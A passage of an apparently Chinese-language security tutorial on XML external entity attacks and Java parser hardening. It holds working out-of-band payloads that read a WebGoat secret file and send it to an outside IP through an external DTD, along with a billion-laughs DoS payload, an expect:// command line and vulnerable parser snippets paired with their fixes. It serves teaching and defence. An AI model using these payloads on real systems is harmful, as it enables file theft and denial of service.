+<p>发送payload2（绕一圈引入）：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://47.102.137.160:1234/xxe.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">text</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="一个疑问"><a href="#一个疑问" class="headerlink" title="一个疑问"></a>一个疑问</h4><p>为啥不能不读取远程，只发送至远程</p>
+<blockquote>
+<p>为什么需要引入外部dtd，不能够直接发给服务端dtd读取好文件，输出给外部服务器么？<br>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&gt; &lt;!DOCTYPE xxe [</span><br><span class="line">&gt; &lt;!ENTITY % file SYSTEM &quot;file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt&quot;&gt;</span><br><span class="line">&gt; &lt;!ENTITY % print &quot;&lt;!ENTITY send SYSTEM &apos;http://47.102.137.160:1234/xxe.xml?c=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">&gt; %print;</span><br><span class="line">&gt; ]&gt;</span><br><span class="line">&gt; &lt;comment&gt;</span><br><span class="line">&gt; 	&lt;text&gt;&amp;send;&lt;/text&gt;</span><br><span class="line">&gt; &lt;/comment&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>这样就可以直接在外部读取到file<br>但事实是不可以的，主要是因为外部DTD允许我们在第二个实体中包含一个实体，但在内部DTD不允许这么做。<br>可以参考<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">文章</a><br>这篇文案还说明了当无法读取到外部dtd文件时，利用本地dtd文件进行参数覆盖，读取文件</p>
+</blockquote>
+<h3 id="0x03-报错注入"><a href="#0x03-报错注入" class="headerlink" title="0x03.报错注入"></a>0x03.报错注入</h3><p>其实和盲注一样，只需要最后发送信息至一个不存在的地方就会产生附带路径的报错。<br>攻击者主机xml文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">webgoat</span>/<span class="attr">.webgoat-8.0.0.M25</span>/<span class="attr">XXE</span>/<span class="attr">secret.txt</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://xxxx.xx.xx.x/xxe.xml?c=%file;'&gt;"&gt;</span><br><span class="line">%print;</span><br></pre></td></tr></table></figure></p>
+<p>攻击者发送payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE RemoteDTD SYSTEM "http://47.102.137.160:1234/xxe.dtd" &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入&amp;send;即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x04-DOS攻击"><a href="#0x04-DOS攻击" class="headerlink" title="0x04.DOS攻击"></a>0x04.DOS攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol "lol"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h2><table>
+<thead>
+<tr>
+<th>libxml2</th>
+<th>PHP</th>
+<th>JAVA</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file<br>http<br>ftp</td>
+<td>file<br>http<br>ftp<br>php<br>compress.zlib<br>compress.bzip2<br>data<br>glob<br>phar<br>expect</td>
+<td>http<br>htps<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher<br></td>
+<td>file<br>http<br>https<br>ftp</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//php协议解析</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">//netdoc协议解析</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;netdoc:///var/www/html&quot;&gt;</span><br><span class="line">//php如果开了PECL上的Expect扩展</span><br><span class="line">&lt;!ENTITY content SYSTEM &quot;expect://dir .&quot;&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>JDK1.6u35 、JDK1.7u7 之后开始恢复对于gopher方案的支持</p>
+<p>libxml是PHP对xml的支持</p>
+</blockquote>
+<h2 id="JAVA组件案例"><a href="#JAVA组件案例" class="headerlink" title="JAVA组件案例"></a>JAVA组件案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">DocumentHelper.parseText</span><br><span class="line">DocumentBuilder</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br><span class="line">rg.xml.sax.SAXParseExceptionpublicId</span><br></pre></td></tr></table></figure>
+<p>以下案例均取自参考。</p>
+<h3 id="0x01-DocumentBuilder"><a href="#0x01-DocumentBuilder" class="headerlink" title="0x01.DocumentBuilder"></a>0x01.DocumentBuilder</h3><p>java组件：javax.xml.parsers.*</p>
+<p>组件漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">    DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    Document doc = db.parse(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     </span><br><span class="line"><span class="comment">/*以下为修复代码*/</span>            <span class="comment">//https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</span></span><br><span class="line"><span class="comment">//禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span></span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>); <span class="comment">//首选</span></span><br><span class="line"><span class="comment">//如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span></span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);        <span class="comment">//防止外部实体POC </span></span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);   <span class="comment">//防止参数实体POC</span></span><br><span class="line"><span class="comment">/*以上为修复代码*/</span>    </span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();        </span><br><span class="line">Document doc = db.parse(request.getInputStream());</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">String FEATURE = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// If you can't completely disable DTDs, then at least do the following:</span></span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-general-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-parameter-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// Disable external DTDs as well</span></span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"</span></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">&gt;..</span><br><span class="line"><span class="comment">// Load XML file or stream using a XXE agnostic configured parser...</span></span><br><span class="line">DocumentBuilder safebuilder = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-SAXBuilder"><a href="#0x02-SAXBuilder" class="headerlink" title="0x02.SAXBuilder"></a>0x02.SAXBuilder</h3><p>java组件：org.jdom2.input.SAXBuilder</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXBuilder sb = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">    Document doc = sb.build(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder sb = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">sb.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">Document doc = sb.build(is);</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-SAXParserFactory"><a href="#0x03-SAXParserFactory" class="headerlink" title="0x03.SAXParserFactory"></a>0x03.SAXParserFactory</h3><p>java组件：javax.xml.parsers.SAXParser / javax.xml.parsers.SAXParserFactory</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">    SAXParser parser = spf.newSAXParser();</span><br><span class="line">    parser.parse(is, (HandlerBase) <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复建议</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-SAXTransformerFactory"><a href="#0x04-SAXTransformerFactory" class="headerlink" title="0x04.SAXTransformerFactory"></a>0x04.SAXTransformerFactory</h3><p>java组件：javax.xml.transform.sax.SAXTransformerFactory。</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    sf.newTransformerHandler(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">sf.newTransformerHandler(source);</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-SAXReader"><a href="#0x05-SAXReader" class="headerlink" title="0x05.SAXReader"></a>0x05.SAXReader</h3><p>java组件：org.dom4j.io.SAXReader</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">    saxReader.read(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.read(is);</span><br></pre></td></tr></table></figure>
+<h3 id="0x06-XMLReader"><a href="#0x06-XMLReader" class="headerlink" title="0x06.XMLReader"></a>0x06.XMLReader</h3><p>java组件：org.xml.sax.helpers.XMLReaderFactory</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">    reader.parse(<span class="keyword">new</span> InputSource(is));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.parse(<span class="keyword">new</span> InputSource(is));</span><br></pre></td></tr></table></figure>
+<h3 id="0x07-SchemaFactory"><a href="#0x07-SchemaFactory" class="headerlink" title="0x07.SchemaFactory"></a>0x07.SchemaFactory</h3><p>java组件：javax.xml.validation.SchemaFactory</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    Schema schema = factory.newSchema(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
